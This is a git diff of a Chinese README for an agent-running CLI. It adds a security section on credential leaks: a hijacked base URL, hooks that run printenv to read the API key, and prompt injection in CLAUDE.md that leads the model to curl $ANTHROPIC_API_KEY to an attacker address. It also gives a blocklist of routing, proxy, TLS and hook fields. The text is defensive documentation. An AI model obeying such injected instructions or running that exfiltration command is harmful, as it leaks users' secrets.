@@ -116,6 +116,27 @@ agent-fleet run-many --config batch.json [--json]
 - `--json`:输出结构化 JSON(`ok`、`result`、`numTurns`、`totalCostUsd`、`sessionId` 等字段),方便被
   其他程序/脚本解析
 
+### 自定义请求头(只有自备网关才会用到)
+
+有些第三方网关/企业代理除了 API Key 还要求带一个额外的认证头。这种头的值本身就是凭据,所以规则和
+API Key 完全一致:`models.config.json` 里只写**指针**,真实值只放 `.env`。
+
+```jsonc
+"my-gateway": {
+  "baseURL": "https://gateway.example.com/anthropic",
+  "model": "whatever-your-gateway-calls-it",
+  "apiKeyEnv": "MY_GATEWAY_API_KEY",
+  "headerEnvs": { "X-Gateway-Auth": "MY_GATEWAY_HEADER_TOKEN" }  // 值是变量名,不是真实值
+}
+```
+
+强制约束(加载配置时就会校验,不合规直接报错退出):
+
+- 不允许写字面量 `headers`——那个文件会进 git。
+- `headerEnvs` 的值必须是环境变量名;头值里带换行符会被拒绝(防请求头注入)。
+- 不允许自定义 `x-api-key` / `Authorization` 等由 `authHeader` 负责的头。
+- `list-models` 只显示头名和 present/missing,**从不打印头值**。
+
 ## 验证情况(如实说明)
 
 没有真实的 DeepSeek/Moonshot API key(也没有去别的项目"顺手"拿),所以**没有做过真实模型的端到端
@@ -133,16 +154,16 @@ agent-fleet run-many --config batch.json [--json]
 
    这条验证**不需要任何真实密钥**,`npm run smoke-test` 随时可以重跑。
 
-3. **联调过程中发现并修复了一个真实的安全问题**:在"当前进程本身就是被另一个 Claude Code 会话
-   启动的子进程"这种场景下实测发现,即使显式配置了第三方 `baseURL` + API key,请求最终仍然会带着
-   宿主会话自己的 OAuth 登录凭据发出去,完全绕过了显式配置的第三方 key——根因是宿主进程环境变量里
-   残留的 `CLAUDE_CODE_SDK_HAS_HOST_AUTH_REFRESH` 等"宿主自动帮子进程刷新登录态"的变量族。已经在
-   `src/isolated-env.mjs` 里修好:每次调用前会先剥离所有 `CLAUDE_CODE_*` / `ANTHROPIC_*` 环境变量,
-   再叠上这次任务真正要用的配置,并把 `settingSources` 限定为只加载目标工作目录自己的项目配置,
-   不加载操作者本机的全局 `~/.claude/settings.json`(避免连带加载操作者个人的 hooks、MCP server)。
-   对绝大多数直接在普通终端里用这个工具的人来说这个坑本来就不会碰到,但这层防御是免费的,而且能
-   防止"把你电脑上其它凭据/配置意外发给 `models.config.json` 里配置的任意第三方地址"这类真实泄露
-   风险。
+3. **安全回归测试**(`test/security-unit-test.mjs` + `test/security-e2e-test.mjs`,
+   `npm run security-test`):专门守下面「安全边界」一节那几条不变量。端到端那一半会同时起**两个**
+   本地假上游——一个扮演"你配置的正经上游",一个扮演"攻击者地址",然后按"攻击者那边到底收没收到
+   密钥"来判定,而不是断言代码里有没有某一行。覆盖:宿主凭据泄露场景、目标目录劫持 `baseURL`、
+   目标目录注入自定义头、恶意配置藏在祖先目录、绕过前置闸门时结构性兜底是否还在,外加两条
+   正向用例(正常项目目录不被误拦、合法自定义头仍然能用)。同样**不需要任何真实密钥**。
+
+   跑全部验证:`npm test`。
+
+4. **联调和复核过程中发现并修复了三个真实的安全问题**,详见下面「安全边界」一节。
 
 ## 接下来你需要做的事
 
@@ -159,8 +180,81 @@ agent-fleet run-many --config batch.json [--json]
 
 ## 安全边界
 
+### 谁说了算:信任模型
+
+这个工具的核心信任规则只有一条:
+
+> **「请求发去哪个地址、带什么凭据、带什么额外请求头」的唯一真相源,是你自己的
+> `models.config.json` + `.env`。其它任何来源都无权改动这三件事,也无权让这台机器在
+> 带着这些凭据的环境里自动执行命令。**
+
+"其它任何来源"具体指两类,都已经出过真实漏洞:
+
+| 不可信来源 | 它曾经能干什么 | 现在怎么挡的 |
+|---|---|---|
+| **继承来的宿主环境变量**(你在另一个 Claude Code 会话里嵌套跑这个工具时) | 宿主的 OAuth 登录态、宿主配的 `ANTHROPIC_CUSTOM_HEADERS`(可能是企业代理口令)会跟着请求发给你配的第三方地址 | `src/isolated-env.mjs`:每次调用前整族剥离 `ANTHROPIC_*` / `CLAUDE_*` 环境变量,再只叠回本次任务要用的那几个 |
+| **`--cwd` 指向的目标工作目录**(可能是别人发给你的项目文件夹) | 目录里自带一份 `.claude/settings.json`,用 `env.ANTHROPIC_BASE_URL` 就能把请求整个劫持到攻击者地址,**你配置在 `.env` 里的真实第三方 key 被原样送过去**;`hooks` 字段则能在会话启动时无条件执行任意命令,一条 `printenv` 就把密钥读走 | 两层:`src/project-trust.mjs` 前置闸门直接拒绝运行 + `src/run-task.mjs` 把路由钉在优先级最高的 flag 层配置里 |
+
+第二条尤其要注意:它**不需要**"嵌套在另一个 Claude Code 会话里"这个前提,只要你拿这个工具去处理一个
+别人给的目录就会触发,所以危害比第一条更高。而且它**不需要模型配合**——`hooks` 那条是无条件执行的,
+不像 prompt injection 还要看模型上不上钩。
+
+### 目标工作目录能做什么、不能做什么
+
+`--cwd` 指向的目录仍然可以带自己的 `CLAUDE.md`、`permissions`、`outputStyle` 等**描述性的本地行为**
+配置——那是这个工具的正常用法,决定 Agent 在这个目录里怎么干活。
+
+它**不能**做的事(命中任何一条,整次运行直接报错退出,连密钥都不会被读进内存):
+
+- 设置任何 `ANTHROPIC_*` / `CLAUDE_*` / `AWS_*` / `GOOGLE_*` / `GEMINI_*` / `OPENAI_*` 等
+  路由与凭据变量族
+- 设置代理(`HTTPS_PROXY`、小写的 `https_proxy` 等)——改代理等于把全部流量连同密钥导给中间人
+- 换 TLS 信任根或关掉证书校验(`NODE_EXTRA_CA_CERTS`、`NODE_TLS_REJECT_UNAUTHORIZED` …)
+- 设置 `NODE_OPTIONS`(可以往 CLI 进程里注入模块直接钩出站请求)
+- 设置任何名字里带 `API_KEY` / `TOKEN` / `SECRET` / `CREDENTIAL` / `PASSWORD` 的变量
+- 使用 `apiKeyHelper` / `awsAuthRefresh` / `otelHeadersHelper` / `forceLoginMethod` 这类
+  "由我来决定凭据从哪来"的顶层字段
+- 使用 `hooks` / `statusLine` / 插件装载(`enabledPlugins` 等)——这些字段的值是**会被自动执行的
+  命令**,而子进程环境里带着你的真实密钥。实测确认:一份带 `SessionStart` hook 的项目配置,
+  `printenv ANTHROPIC_API_KEY` 就能把密钥写出来,全程不需要模型配合
+
+另外目标目录里的 `.mcp.json` 不再被自动加载(`strictMcpConfig`)——MCP server 条目同样是"会话启动时
+自动执行的命令"。
+
+选择"直接拒绝"而不是"忽略该字段继续跑":一个正经项目没有任何理由去重定向别人工具的模型流量,出现
+这种字段本身就是强信号,静默忽略等于把攻击尝试藏起来。报错信息会告诉你是哪个文件的哪个字段。
+
+代价要说清楚:**目标目录里的项目 hooks 从此不会生效**。如果你在自己的项目里依赖 hooks,用这个工具
+处理该目录时会直接报错退出。这是有意的取舍——在"目录可能来自外部"这个前提下,自动执行命令的字段
+没法安全放行。
+
+### 其它既有约束
+
 - 代码、配置模板、这份 README 里都没有写过任何真实 API key。
 - `.env` 已被仓库 `.gitignore` 排除。
-- `models.config.json` 本身允许提交进 git——它不含密钥,`apiKeyEnv` 只是变量名指针;如果有人不小心
-  往里面直接写字面量 `apiKey`,`src/config.mjs` 加载时会直接拒绝并报错。
-- `list-models` 只显示密钥状态(present/missing),从不打印密钥本身的值。
+- `models.config.json` 本身允许提交进 git——它不含密钥,`apiKeyEnv` / `headerEnvs` 都只是变量名指针;
+  如果有人不小心往里面直接写字面量 `apiKey` 或 `headers`,`src/config.mjs` 加载时会直接拒绝并报错。
+- `list-models` 只显示密钥和自定义头的状态(present/missing),从不打印它们的值。
+- 只加载目标目录自己的项目配置,不加载操作者本机的全局 `~/.claude/settings.json`。
+
+### 还没解决的风险(不要误读上面这些防护的强度)
+
+**这个工具目前仍然不适合用来处理你完全不信任的目录。** 上面修的是"零交互、纯配置驱动"的静默劫持:
+攻击者不需要你做任何事,把工具指过去密钥就没了。这类路径已经堵上。
+
+但 agent-fleet 跑的是 `bypassPermissions` 的自主 Agent——它会读目录里的文件、执行 bash,而且
+**不需要人工确认每一步**。所以一个恶意目录仍然可以:
+
+- 在 `CLAUDE.md` 或任何会被读到的文件里写 prompt injection,诱导模型自己执行
+  `curl 攻击者地址 -d "$ANTHROPIC_API_KEY"`;
+- 诱导模型读取并外发这台机器上的其它文件(SSH 私钥、其它项目的 `.env` 等)。
+
+另外要诚实说明:上面那张"不能做什么"的清单是**黑名单**,不是完备的白名单。Claude Code 后续版本新增
+的字段如果也能执行命令或影响出口,需要有人把它补进 `src/project-trust.mjs`。开发过程中就已经出现过
+一次这种情况——最初只盯着 `env` 块和凭据类字段,`hooks` 是后来实测才发现同样能直接读走密钥的。
+
+这是 `bypassPermissions` 这个设计选择的固有代价,不是配置层能解决的问题。实务建议:
+
+- 处理来路不明的目录时,**先把它当成不可信代码看待**,或者干脆别用这个工具;
+- 真要跑,放进容器/一次性虚拟机里跑,别在装着你全部凭据的主力机器上跑;
+- `.env` 里只放这个工具真正需要的第三方 key,别把它和别的凭据堆在同一个 shell 环境里。
